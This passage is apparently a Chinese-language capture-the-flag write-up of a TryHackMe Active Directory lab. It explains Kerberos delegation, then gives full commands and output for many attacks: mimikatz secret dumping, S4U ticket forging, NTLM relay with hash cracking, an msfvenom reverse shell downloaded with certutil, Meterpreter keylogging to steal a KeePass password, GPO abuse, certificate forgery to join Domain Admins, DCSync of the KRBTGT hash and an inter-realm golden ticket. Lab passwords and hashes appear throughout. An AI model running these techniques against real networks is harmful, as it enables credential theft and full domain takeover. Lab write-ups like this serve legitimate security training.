发出请求。这次的请求是希望以用户 A的身份，去访问一个被约束性委派允许访问的服务 B**（例如，一个敏感数据库）。KDC 收到这个请求后，会进行严格的检查： 检查该服务账户是否被允许代表用户去访问服务 B。 这个检查是通过查看服务账户的 msDS-AllowedToDelegateTo 属性中是否包含服务 B 的 SPN。 如果检查通过，KDC 就会为攻击者（以服务账户的身份）颁发一个 TGS，这个 TGS 明确表示攻击者现在可以以用户 A的身份去访问服务 B。 访问目标服务： 攻击者使用这个 TGS，就可以冒充用户 A，去访问敏感数据库，并执行用户 A 有权限的任何操作。 什么是非敏感的用户账户？在 Kerberos 委派的上下文中，“非敏感用户账户”指的是没有被设置为拒绝委派的账户。 在 Active Directory 中，某些账户可以被标记为**“敏感且不可委派”**（Account is sensitive and cannot be delegated）或属于 Protected Users 组。 如果一个账户被标记为敏感，或者属于 Protected Users 组，那么 KDC 会拒绝任何 S4U 请求，即不允许其他服务账户代表这个用户去访问任何其他服务。 攻击者通常会选择那些没有这些安全标记的普通用户账户进行冒充。虽然攻击者无法冒充域管理员，但他们可以冒充一个有权访问敏感数据库的普通用户，这同样能造成巨大的危害。 Resource-Based Constrained Delegation实际上，Kerberos 委派有三种类型。但这一种值得单独提出来说。**基于资源的约束性委派（RBCD）**由微软在 2012 年引入，它再次为 Kerberos 委派增加了额外的安全限制。 RBCD 彻底改变了委派模型。它不再是指定哪个对象可以委派给哪个服务，而是由服务本身来指定哪个对象可以委派给它。这使得服务所有者能够控制谁可以访问它。 在我们 Web 应用程序的例子中，这意味着我们不再需要在 Web 服务账户上指定它可以委派给数据库服务来访问数据库；而是可以在数据库服务上指定，允许 Web 服务账户委派访问它。 假设我们有权限为某个服务配置 RBCD。这意味着我们有能力为该服务的 AD 对象设置 msDS-AllowedToActOnBehalfOfOtherIdentity 属性。我们可以用我们拥有的一个 AD 账户的详细信息来填充这个属性。为了现在获得对该服务的访问权限，我们可以为我们控制的账户生成一个 TGT，这将允许我们与该服务进行交互。如果你想看一个 RBCD 漏洞利用的详细例子，可以看这里。 三种委派的区别这三种委派方式的主要区别在于谁拥有权限控制权，以及权限的范围有多大。 非约束性委派 (Unconstrained Delegation) 控制权：权限控制权在服务账户本身。 权限范围：无限制。 工作原理：当用户访问一个配置了非约束性委派的服务器时，KDC 会将用户的 TGT (票据授权票据) 连同服务票据一起发送给服务器。服务器会将这个 TGT 存储在内存中。有了这个 TGT，服务器可以代表该用户去访问域中任何其他服务，没有任何限制。 安全性：最不安全。一旦攻击者攻陷了这台服务器，他们就可以从内存中窃取所有用户的 TGT，从而完全冒充这些用户，包括域管理员。 约束性委派 (Constrained Delegation) 控制权：权限控制权在服务账户。 权限范围：有限制，但受限于服务账户本身。 工作原理：管理员在 AD 中为服务账户配置一个列表，明确指定这个服务账户可以代表用户去访问哪些特定的服务（通过服务主名称 SPN 来指定）。当服务需要代表用户访问其他服务时，它会向 KDC 证明自己有代表用户的能力，然后 KDC 才会为它颁发一个专门用于访问指定服务的票据。 安全性：比非约束性委派安全得多，因为它限制了服务可以访问的资源范围。即使服务账户被攻陷，攻击者也只能冒充用户去访问这个列表中指定的那些服务。 基于资源的约束性委派 (Resource-Based Constrained Delegation, RBCD) 控制权：权限控制权在资源（或服务）所有者。 权限范围：有限制，且限制在资源本身。 工作原理：这种模式颠倒了控制逻辑。管理员不是在服务账户上配置它能访问哪些服务，而是在被访问的资源（例如 SQL 服务器）上配置一个列表，明确指定哪些服务账户被允许代表用户来访问它。 安全性：最安全。这种模式将权限控制权下放给了资源所有者，他们可以更精细地控制谁可以访问他们的资源。这使得横向移动攻击更加困难，因为攻击者即使攻陷了某个服务账户，也不能随意冒充用户去访问未授权的资源。 总结表格 特性 非约束性委派 约束性委派 基于资源的约束性委派 (RBCD) 控制权 服务账户 服务账户 资源账户 配置位置 服务账户对象上 服务账户对象上 资源（被访问服务）对象上 权限范围 域内所有服务 指定的服务列表 允许访问资源的特定服务列表 安全性 最低 较高 最高 实践这个任务会利用受限制的委托完成，首先我们要做的是枚举可用的委托。让我们使用新的特权用户来执行网络命令。我们可以运行以下命令，使用 PowerSploit 的 Get-NetUser cmdlet 进行枚举： 12345678910111213141516171819202122232425262728293031323334353637Import-Module C:\\Tools\\PowerView.ps1 Get-NetUser -TrustedToAuth logoncount : 39 badpasswordtime : 1/1/1601 12:00:00 AM distinguishedname : CN=IIS Server,CN=Users,DC=za,DC=tryhackme,DC=loc objectclass : {top, person, organizationalPerson, user} displayname : IIS Server lastlogontimestamp : 8/4/2025 11:50:10 AM userprincipalname : svcIIS@za.tryhackme.loc name : IIS Server objectsid : S-1-5-21-3885271727-2693558621-2658995185-6155 samaccountname : svcIIS codepage : 0 samaccounttype : USER_OBJECT accountexpires : NEVER countrycode : 0 whenchanged : 8/4/2025 10:50:10 AM instancetype : 4 usncreated : 78494 objectguid : 11e42287-0a25-4d73-800d-b62e2d2a2a4b sn : Server lastlogoff : 1/1/1601 12:00:00 AM msds-allowedtodelegateto : {WSMAN/THMSERVER1.za.tryhackme.loc, WSMAN/THMSERVER1, http/THMSERVER1.za.tryhackme.loc, http/THMSERVER1} objectcategory : CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc dscorepropagationdata : 1/1/1601 12:00:00 AM serviceprincipalname : HTTP/svcServWeb.za.tryhackme.loc givenname : IIS lastlogon : 8/5/2025 2:43:56 AM badpwdcount : 0 cn : IIS Server useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION whencreated : 4/27/2022 11:26:21 AM primarygroupid : 513 pwdlastset : 4/29/2022 11:50:25 AM usnchanged : 176228 从上面的输出（关注 msds-allowedtodelegateto）我们可以看到 svcIIS 账户可以在 THMSERVER1 上委派 HTTP 和 WSWAN 服务。你会认为这意味着我们只能代表冒充用户访问网站。但是，PowerShell Remoting 也使用 HTTP 和 WSMAN 服务。最理想的选择是冒充 Tier 1 管理员，因为这样我们就能获得 THMSERVER1 的管理访问权限。 如果你在 THMWRK1 上执行适当的后渗透枚举，你会发现主机上有一个以 svcIIS 用户身份运行的服务。由于我们现在拥有管理权限，因此我们可以利用这一点来转储 LSASecrets，这是 Windows 注册表配置单元的一部分，其中存储了 Windows 服务等功能的凭据。 1234567891011# 运行 mimikatz C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe # 提升到 SYSTEM 权限 token::elevate # 从注册表配置单元提取明文凭据 lsadump::secrets ... Secret : _SC_thmwinauth / service &#39;thmwinauth&#39; with username : svcIIS@za.tryhackme.loc cur/text: Password1@ 现在有了 svcIIS 账户的密码，我们能用 Kekeo 和 Mimikatz 组合实现 Kerberos Delegation 攻击，我们会用 Kekeo 生成 ticket 然后用 Mimikatz 去加载 ticket 进内存。 123456789# 找一个受害者 Get-ADGroupMember -Identity &quot;Tier 1 Admins&quot; # t1_eileen.burton # 执行 kekeo C:\\Tools\\kekeo\\x64\\kekeo.exe # 生成一个 svcIIS 的 TGT tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@ 现在我们有了可以执行委托的账户的 TGT，就可以为要冒充的账户伪造 TGS 请求了。我们需要对 HTTP 和 WSMAN 执行此操作，以便在 THMSERVER1 上创建 PSSession： 1234# 以用户 t1_eileen.burton 的身份生成一个 HTTP TGS tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_eileen.burton /service:http/THMSERVER1.za.tryhackme.loc # 以用户 t1_eileen.burton 的身份生成一个 WSMAN TGS tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_eileen.burton /service:wsman/THMSERVER1.za.tryhackme.loc 现在用 mimikatz 导入这两个 TGS： 1234567891011121314151617181920212223242526272829303132333435363738394041# 打开 mimikatz C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe privilege::debug # 载入 TGS kerberos::ptt TGS_t1_eileen.burton@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi kerberos::ptt TGS_t1_eileen.burton@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi exit # 使用 klist 查看载入的 TGS klist Current LogonId is 0:0x3bb224 Cached Tickets: (2) #0> Client: t1_eileen.burton @ ZA.TRYHACKME.LOC Server: http/THMSERVER1.za.tryhackme.loc @ ZA.TRYHACKME.LOC KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96 Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize Start Time: 8/5/2025 7:07:51 (local) End Time: 8/5/2025 17:07:48 (local) Renew Time: 8/12/2025 7:07:48 (local) Session Key Type: AES-256-CTS-HMAC-SHA1-96 Cache Flags: 0 Kdc Called: #1> Client: t1_eileen.burton @ ZA.TRYHACKME.LOC Server: wsman/THMSERVER1.za.tryhackme.loc @ ZA.TRYHACKME.LOC KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96 Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize Start Time: 8/5/2025 7:08:01 (local) End Time: 8/5/2025 17:07:48 (local) Renew Time: 8/12/2025 7:07:48 (local) Session Key Type: AES-256-CTS-HMAC-SHA1-96 Cache Flags: 0 Kdc Called: # 进入 PSSession Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc 这下就有 THMSERVER1 的 Shell 了。 推荐阅读What Is Kerberos Delegation? An Overview of Kerberos Delegation Exploiting Relays这个房间讲的就是利用 SMB 没用强制要求加密的漏洞，导致认证可以被截获。 Windows 主机都有一个机器账户。本质上，这是与该机器关联的用户账户。除非有人篡改过主机的账户，否则这些账户的密码是不可破解的。默认情况下，它们的密码长达 120 个字符（UTF16 编码），并每 30 天自动轮换一次。 在 AD 中，这些机器账户被大量用于不同的服务中。不同的域控制器使用它们的机器账户来同步 AD 的更新和更改。当你代表你正在工作的主机请求一个证书时，该主机的机器账户会被用于向 AD 证书服务进行身份验证。 在 AD 中有一个特殊情况，即一台机器对另一台机器拥有管理权限。本质上，在 AD 配置中，一台主机被授予了对另一台主机的管理权限。同样，这是预期的功能，例如必须进行同步的域控制器或 SQL 集群。然而，这些实例为强制认证提供了一个非常有趣的攻击途径。 使用以下的语法能在 BloodHound 中查询到这个途径： 1MATCH p=(c1:Computer)-[r1:MemberOf*1..]-&gt;(g:Group)-[r2:AdminTo]-&gt;(n:Computer) RETURN p 这里我梳理一下，SERVER MANAGEMENT 组是 THMSERVER1 的管理员，然后 THMSERVER2 是 SERVER MANAGEMENT 组的一员，这就代表 THMSERVER2 对 THMSERVER1 有管理权限。 打印机 Bug这个打印机漏洞是 MS-RPRN 协议（打印系统远程协议）的一个“功能”，它允许一个域用户远程强制运行了 Print Spooler 服务的目标主机向一个任意的 IP 地址进行身份验证。 因此，要利用这一点，除了拥有机器账户的管理权限之外，我们还需要满足以下四个条件： 一套有效的 AD 账户凭据。 与目标主机的 SMB 服务的网络连接。 目标主机必须运行 Print Spooler 服务。 主机必须没有强制启用 SMB 签名。 我们要在对 THMSERVER2 没有访问权限的情况下确定 Print Spooler Service 是否在运行。 1234GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc # 如果提示 Access Denied 就用这个命令 Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc 如果都获取不到结果，直接忽略他，靶机环境肯定是可以用的 SMB 签名为了中继强制的身份验证尝试，不应该强制启用 SMB 签名。允许 SMB 签名和强制启用 SMB 签名是有区别的。由于一些遗留系统不支持 SMB 签名，默认情况下，SMB 的配置是允许但非强制签名，这意味着只有在双方都支持时才会使用。由于我们将托管一个恶意的 SMB 服务器，我们可以确保我们的服务器不支持签名，从而强制目标不签署 SMB 身份验证尝试。 参考文章：https://www.freebuf.com/articles/network/383408.html 检查 SMB 强制签名是否打开可以用 nmap 扫描： 1nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc 我们会用 SpoolSample 实现这个认证中继攻击，强制 THMSERVER2 去向我们进行身份认证，再用 impacket 的 ntlmrelayx.py 中继到 THMSERVER1，这样我们就相当于有 THMSERVER2 的权限了（中继服务器把认证截获了，不是这台机器的 Shell 权限，指的是 THMSERVER2 访问 THMSERVER1 的权限）。 123456789101112# 执行命令 python ntlmrelayx.py -smb2support -t smb://10.200.60.201 -c &#39;whoami /all&#39; -debug # 拿 Flag python ntlmrelayx.py -smb2support -t smb://10.200.60.201 -c &quot;powershell -c \\&quot;Get-Content C:/Users/Administrator.ZA/Desktop/flag3.txt\\&quot;&quot; -debug # 进 SMB 会话 python ntlmrelayx.py -smb2support -t smb://10.200.60.201 -i -debug nc 127.0.0.1 11000 # RDP 连接到机器 xfreerdp3 /v:thmwrk1.za.tryhackme.loc /d:za.tryhackme.loc /u:t2_melanie.davies /p:Pass123... /timeout:60000 C:\\Tools\\SpoolSample.exe THMSERVER2.za.tryhackme.loc &quot;10.50.57.85&quot; 同时可以提取用户的 Hash 去爆破 12345678910111213141516171819# Hashdump 要 10 分钟以上 python ntlmrelayx.py -smb2support -t smb://10.200.60.201 -debug ServerAdmin:500:aad3b435b51404eeaad3b435b51404ee:3279a0c6dfe15dc3fb6e9c26dd9b066c::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92728d5173fc94a54e84f8b457af63a8::: vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e96eab5f240174fe2754efc94f6a53ae::: trevor.local:1001:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a::: # 用 Hashcat 爆破密码 ./hashcat.exe hash.txt rockyou.txt 31d6cfe0d16ae931b73c59d7e0c089c0: Approaching final keyspace - workload adjusted. # 破解出来 trevor.local 账户的密码 RDP 登不上去 43460d636f269c709b20049cee36ae7a:Password1@ # SSH 也登不上去 ssh trevor.local@THMSERVER1.za.tryhackme.loc Exploiting AD Users现在我们在工作站和服务器上有完整的管理权了，现在可以进行后渗透了。 这一节是从用户下手，收集用户的使用习惯 凭证管理 - 用户如何存储其凭证。在 AD 中，这一点相当重要，因为用户可能有多套凭证，记住所有凭证可能会很麻烦，这一节会拿一个 KeePass 下手。 键盘记录和截屏 寻找密码管理器数据库要找一个后缀是 .kdbx 的文件，这是 KeePass 的数据库文件，但是这个数据库被一个密码加密，我们还要找到这个密码。 这里用 Meterpreter 解决 1234567891011# 生成小马 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.50.57.85 LPORT=4444 -f exe -o shell.ps1 msfconsole -q -x &quot;use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.50.57.85; set LPORT 4444; exploit&quot; # 下载文件 certutil.exe -urlcache -split -f http://10.50.57.85:8081/shell.ps1 # curl 下载 wget -o shell.exe http://10.50.57.85:8081/shell.ps1 # 执行小马 ./shell.ps1 找 kdbx 文件： 123456789101112131415meterpreter &gt; search -d &quot;C:/Users/&quot; -f *.kdbx Found 6 results... ================== Path Size (bytes) Modified (UTC) ---- ------------ -------------- C:\\Users\\Administrator.ZA\\Documents\\PasswordDatabase.kdbx 1886 2022-04-27 16:45:29 -0400 C:\\Users\\Administrator.ZA\\My Documents\\PasswordDatabase.kdbx 1886 2022-04-27 16:45:29 -0400 C:\\Users\\t1_trevor.jones\\Documents\\PasswordDatabase.kdbx 1886 2022-04-27 16:45:29 -0400 C:\\Users\\t1_trevor.jones\\My Documents\\PasswordDatabase.kdbx 1886 2022-04-27 16:45:29 -0400 C:\\Users\\trevor.local\\Documents\\PasswordDatabase.kdbx 2190 2022-04-30 11:36:02 -0400 C:\\Users\\trevor.local\\My Documents\\PasswordDatabase.kdbx 2190 2022-04-30 11:36:02 -0400 # 下载文件 download &quot;C:\\Users\\Administrator.ZA\\Documents\\PasswordDatabase.kdbx&quot; admin.kdbx download &quot;c:\\Users\\trevor.local\\Documents\\PasswordDatabase.kdbx&quot; trevor.kdbx 寻找密码管理器主密码现在就是要抓到那个数据库的密码了。 123456789101112131415161718192021222324# 用这个命令看用户是不是活跃 ps | grep &quot;explorer&quot; # 没回显就跟着下面做 # 进 shell shell # 改用户的密码 net user trevor.local Pass123... # 登录 RDP xfreerdp3 /v:10.200.60.201 /u:trevor.local /p:Pass123... /timeout:60000 # 查看 Explorer 的 PID ps | grep &quot;explorer&quot; # 转移到用户的会话下面 migrate 4360 # 抓用户输入 keyscan_start # 过2分钟执行这个，就把输入抓出来了 keyscan_dump Dumping captured keystrokes... keep&lt;CR&gt; &lt;Shift&gt;Imreallysurenoonewillguessmypassword&lt;CR&gt; 从这里下客户端：https://sourceforge.net/projects/keepass/files/KeePass%201.x/1.43/KeePass-1.43.zip/download 然后导入数据库，用抓到的密码解密，两个数据库我都帮你们看了，Administrator 用户是空的数据库，那个本地用户的数据库里有货。顺利拿到 flag 和一个 svcServMan 用户的密码。 Exploiting GPO上一节拿到了 svcServMan 用户，我们就可以从这里下手，看看这个用户有什么用。 这个攻击路径非常清晰： 初始权限：我们拥有一个账户，它对 MANAGEMENT SERVER PUSHES GPO 拥有 GenericWrite 权限。 攻击目标：这个 GPO 通过 GpLink 链接到了 MANAGEMENT SERVER OU。 最终受害者：MANAGEMENT SERVER OU 包含了机器 THMSERVER2.ZA.TRYHACKME.LOC。 因此，我们可以利用 GenericWrite 权限修改 GPO 的内容，然后这个被修改的 GPO 会自动应用到 THMSERVER2 这台机器上，从而让我们控制这台主机。 组策略对象（GPO）GPO 是一个包含各种策略设置的虚拟集合，每台 Windows 计算机都有一个本地策略配置，可设置防火墙、用户组、启动脚本和安全协议等。在大型组织中，为了集中管理这些设置，可以使用**组策略管理（GPM）**来在 Active Directory (AD) 结构上定义 GPO。 GPO 的存储与应用所有 GPO 都以唯一的 GUID 名称存储在 AD 的 SYSVOL 目录下，并被复制到所有加入域的机器上。域内计算机每隔 15 分钟会自动从 SYSVOL 目录拉取 GPO 并应用相关策略。也可以通过手动运行 gpupdate 命令来立即应用。 Exploiting GPOs在本地管理员组和本地远程桌面用户组中添加一个我们控制的 AD 账户。这样，我们就能获得 THMSERVER2 的管理权限，并能 RDP 登录。 为了修改 GPO，我们需要以拥有相关权限的 AD 用户身份访问组策略管理。使用 runas 命令将 AD 用户的凭据注入内存，然后打开 MMC 修改 GPO。 123456runas /netonly /user:za.tryhackme.loc\\svcServMan cmd.exe Sup3rStr0ngPass!@ # 验证一下密码 dir \\\\za.tryhackme.loc\\sysvol # 打开 MMC mmc 添加好管理单元然后展开，可以看到我们现在可以编辑这个 GPO。 把 IT Support 加入这个组就行。 等 15 分钟左右，让 GPO 生效，这下我们一开始加入 IT Support 组的用户就有对 THMSERVER2 的管理和 RDP 权限了。 1xfreerdp3 /v:thmserver2.za.tryhackme.loc /d:za.tryhackme.loc /u:barbara.reid /p:Password1 /timeout:60000 Exploiting Certificates利用证书生成 TGT (Ticket Granting Ticket) 的机制，是 Kerberos 协议的一个扩展功能，称为 PKINIT（Public Key Cryptography for Initial Authentication in Kerberos）。 简单来说，PKINIT 允许客户端使用数字证书来替代传统的用户名和密码进行 Kerberos 的初始认证，也就是获取 TGT 的过程。 SpecterOps 所做的研究和发布的白皮书显示，利用配置错误的证书模板进行权限升级和横向移动是可能的，主要讲的是用证书模板的一些参数，以下是示例： Client Authentication - 证书可用于客户端身份验证。 CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT - 证书模板允许我们指定 Subject Alternative Name (SAN)。 CTPRIVATEKEY_FLAG_EXPORTABLE_KEY - 证书可与私钥一起导出。 Certificate Permissions - 我们拥有使用此证书模板所需的权限。 利用证书模板12# 导出证书模板 certutil -Template -v &gt; templates.txt [32] 号证书，我只保留了要关注的字段 123456789Template[32]: TemplatePropPrivateKeyFlags = 1010010 (16842768) CTPRIVATEKEY_FLAG_EXPORTABLE_KEY -- 10 (16) TemplatePropGeneralFlags = 20241 (131649) CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1 Allow Enroll ZA\\THMSERVER2$ Allow Auto-Enroll ZA\\THMSERVER2$ Allow Read ZA\\THMSERVER2$ 安全漏洞点分析 CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT 这个标志是整个攻击的核心。它允许申请者自行指定证书的主体名称。 安全风险: 正常的证书申请，CA 会从你的 AD 账户信息中自动填充你的名字。但这个标志绕过了这个安全机制。 攻击利用: 攻击者可以利用这个点，在申请证书时将主体名称伪造成任何高权限用户（比如 Administrator），从而冒充他人身份。 CTPRIVATEKEY_FLAG_EXPORTABLE_KEY 这个标志使得私钥可以被导出。 安全风险: 私钥是证书的“密码”，它应该被安全地存储在设备上。如果私钥可以被导出，攻击者在获取证书后，就可以将私钥导出并保存在自己的攻击机上。 攻击利用: 攻击者可以偷走私钥，并将其导入到自己的设备中。这样，即使目标系统上的证书被吊销，攻击者仍然可以继续使用这个私钥进行身份验证，实现持久化访问。 Allow Enroll for ZA\\THMSERVER2$ 这个权限配置不当，是攻击的起点。 安全风险: THMSERVER2$ 是一个机器账户，通常权限较低。但这里，它被授予了申请这个证书模板的权限。 攻击利用: 攻击者只需要攻陷 THMSERVER2 这台机器，就可以利用它的机器账户权限，去申请一个具备上述所有漏洞（可自定义主体、可导出私钥）的证书。 这三点环环相扣，构成了一个完美的 AD 证书攻击链： ZA\\THMSERVER2$ 拥有申请证书的权限。 申请时，可以伪造主体名称为 Administrator。 获得的证书的私钥可以被导出，从而实现持久化。 伪造证书去 MMC 生成一张伪造 Administrator@za.tryhackme.loc 的证书，然后带私钥导出来，带私钥是为了生成 TGT，不懂的可以回顾之前 Kerberos 认证过程。 现在，我们终于可以冒充用户了。要做到这一点，需要两个步骤： 使用证书申请 TGT 将 TGT 加载到工具中 第一步，我们用 Rubeus 工具来实现这一点： 123Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:ABC.pfx /password:1 /outfile:tgt.tgt /domain:za.tryhackme.loc /dc:thmdc.za.tryhackme.loc # 这里碰到了报错 [X] KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP 报错 KDC_ERR_PADATA_TYPE_NOSUPP 表明，域控制器不支持你使用的证书类型进行 PKINIT 认证。这可能是因为域控没有正确配置，或者你的工具和域控的协议版本不兼容。我们转成 LDAP 认证，LDAP 认证也支持使用证书，它将证书作为身份凭证来修改目录服务。 做到这一块其实我卡了一个小时作用，这个方法是从 Discord 频道里面找到的，看来 AD 这块我的认知还是太少了。 使用 LDAP 进行认证从这里下载 PassTheCert PowerShell 脚本。我没有加载这个 TGT，而是把我的用户加进 DOMAIN ADMINS 组，这个组对域内的所有机器都有权限，也包括 THMDC 这台机器。 1234567891011121314# 用点源载入脚本 . ./Invoke-PassTheCert.ps1 # 利用证书的权限执行 whoami Invoke-PassTheCert -Server &quot;thmdc.za.tryhackme.loc&quot; -Certificate &quot;c:/tools/ABC.pfx&quot; -CertificatePassword &quot;1&quot; -Whoami # 把自己的用户加进 DOMAIN ADMINS 组 Invoke-PassTheCert -Server &quot;thmdc.za.tryhackme.loc&quot; -Certificate &quot;c:/tools/ABC.pfx&quot; -CertificatePassword &quot;1&quot; -AddToGroup &quot;CN=BARBARA.REID,OU=SALES,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -GroupDN &quot;CN=DOMAIN ADMINS,CN=USERS,DC=ZA,DC=TRYHACKME,DC=LOC&quot; # SSH 连进去 ssh barbara.reid@thmdc.za.tryhackme.loc # 拿 Flag type C:\\Users\\Administrator\\Desktop\\flag5.txt 参考资料https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html https://www.thehacker.recipes/ad/movement/schannel/passthecert Exploiting Domain Trusts域信任是一种机制，允许网络中的用户访问本域之外的资源。它定义了林内部不同域之间的通信方式，在某些特殊情况下，信任也可以扩展到外部域或整个林。 域之间主要有两种信任类型： 方向性：信任的方向是从**信任域（Trusting Domain）**流向**受信域（Trusted Domain）**。 传递性：信任关系不限于两个域之间，而是可以传递到其他被信任的域。 在一个林中，通常会有一个根域或父域，比如我们的 TRYHACKME.LOC。为了方便管理，会为各个地区办事处创建子域，如 ZA.TRYHACKME.LOC 和 UK.TRYHACKME.LOC。 这种林配置使得 ZA 和 UK 办事处可以共享资源。举个例子，如果 UK 办事处的一个用户需要访问 THMSERVER1，我们可以授权该用户访问 ZA 域内的资源。这之所以可行，是因为 ZA 和根域、UK 和根域之间都存在双向信任，从而在 ZA 和 UK 之间建立了可传递的信任关系。 父域和子域之间的双向信任是 Active Directory 的预期行为，它的目的是通过可传递的信任关系来简化资源共享。 然而，作为攻击者，我们也可以利用这个信任关系。如果我们成功攻陷了子域，就可以滥用子域对父域的信任，进一步入侵父域。 KRBTGT and Golden TicketsKRBTGT 是微软实现 Kerberos 认证协议的核心账户。它的名字来自 Kerberos（KRB）和票据授权票据（TGT）。 这个账户本质上就是 Kerberos 分发中心（KDC）服务的“身份”，而 KDC 负责处理所有的 Kerberos 票据请求。KRBTGT 账户的密码哈希被用来加密和签名域内的所有 Kerberos 票据。由于所有域控制器都共享这个哈希，当用户请求访问资源时，域控制器就能用它来验证收到的 TGT 是否真实有效。 黄金票据那么，如果我们想要自己生成 TGT，从而获得对所有资源的访问权限，该怎么办呢？这就是著名的黄金票据攻击（Golden Ticket attack）。 在黄金票据攻击中，我们完全绕过 KDC，自己创建 TGT，摇身一变成为一个临时的票据授权服务器（TGS）。 要伪造 TGT，我们需要收集以下四样关键信息： 域的 FQDN（完全限定域名） 域的安全标识符（SID） 我们想要冒充的用户名 KRBTGT 账户的密码哈希 前三项通常比较容易获取。但最后一项 KRBTGT 的密码哈希，只存储在域控制器上，因此需要我们先攻陷域才能拿到。 dcysnc 攻击dcsync 是一种常见的攻击技术，它利用了 Active Directory（AD）域控制器之间用于同步数据的复制协议。攻击者通过冒充一台域控制器，向另一台域控制器请求复制指定用户的凭据，从而窃取密码哈希。 正常情况下，当一个域控制器上的用户账户发生变化时（比如修改了密码），它会通过一个称为 Directory Replication Service (DRS) Remote Protocol 的协议，通知其他域控制器进行数据同步。 dcsync 攻击正是滥用了这个正常且必要的功能。攻击者在拥有特定高权限账户（通常是域管理员）后，会执行 dcsync 命令，伪装成一个合法的域控制器，并向目标域控制器发送一个数据复制请求。目标域控制器会误以为这是一次正常的同步，并将请求用户的密码哈希发送给攻击者的机器。 接下来，我们将再次使用 Mimikatz，通过 dcsync 攻击在 THMSERVER2 上拿到 KRBTGT 的密码 hash。 123456789101112131415161718# 让我的用户有 DSSync 权限 Invoke-PassTheCert -Server &quot;thmdc.za.tryhackme.loc&quot; -Certificate &quot;c:/tools/ABC.pfx&quot; -CertificatePassword &quot;1&quot; -Elevate &quot;CN=BARBARA.REID,OU=SALES,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot; # 执行 mimikatz mimikatz_trunk\\x64\\mimikatz.exe privilege::debug # 模拟一台域控制器，请求域内的另一台域控制器将 krbtgt 用户的凭据信息复制给我 lsadump::dcsync /user:za\\krbtgt Credentials: Hash NTLM: 16f9af38fca3ada405386b3b57366082 ntlm- 0: 16f9af38fca3ada405386b3b57366082 lm - 0: 35c7b671efe40860dc078afd2786c902 # RDP 连上 THMDC xfreerdp3 /v:thmdc.za.tryhackme.loc /d:za.tryhackme.loc /u:barbara.reid /p:Password1 /timeout:60000 Inter-Realm TGTs我们现在拥有了 KRBTGT 账户的密码哈希，这使我们可以在子域中伪造黄金票据来访问任何资源。更进一步，我们可以伪造一种叫做**跨域 TGT（Inter-Realm TGT）**的票据。这种票据专门用于访问其他域的资源。 我们的目标是利用子域和父域之间的双向信任关系，来获取对父域的完全访问权限。 在伪造黄金票据时，我们将在票据中加入来自其他域的额外账户 SID，以此来执行攻击。Mimikatz 工具可以帮助我们实现这一点，它允许我们在 Kerberos TGT 的 KERB_VALIDATION_INFO 结构中设置 ExtraSids 部分。ExtraSids 被描述为“一个指向 KERB_SID_AND_ATTRIBUTES 结构的指针列表，其中包含的 SID 对应于主体所属账户域之外的其他域中的组”。 这里的关键是，我们将利用父域对我们子域的信任。具体做法是，在为子域的域控制器伪造票据时，我们将 父域中的“Enterprise Admins (EA)”组的 SID 作为额外 SID 添加到票据中。EA 组属于父域，其成员资格实际上赋予了对整个林的管理员权限！这个组的默认 SID 是 S-1-5-21-&lt;RootDomain&gt;-519。 在进行攻击之前，我们首先需要获取两个 SID： 子域域控制器（THMDC）的 SID，这是我们将在伪造的 TGT 中冒充的对象。 父域中 Enterprise Admins 组的 SID，这是我们将作为额外 SID 添加到伪造 TGT 中的 SID。 为了获取这两个 SID，我们可以使用 AD-RSAT PowerShell 命令。我们可以使用以下命令来获取子域域控制器的 SID： 123456# 找到子域控的 SID Get-ADComputer -Identity &quot;THMDC&quot; # S-1-5-21-3885271727-2693558621-2658995185-1001 # 找到父域 Enterprise Admins 组的 SID Get-ADGroup -Identity &quot;Enterprise Admins&quot; -Server thmrootdc.tryhackme.loc # S-1-5-21-3330634377-1326264276-632209373-519 滥用域信任123456789mimikatz_trunk\\x64\\mimikatz.exe privilege::debug # 伪造 Inter-Realm 金票 # 这里的 sids 就是上面父域中找到的那个组的 SID kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:16f9af38fca3ada405386b3b57366082 /sids:S-1-5-21-3330634377-1326264276-632209373-519 /ptt # 拿 Flag type 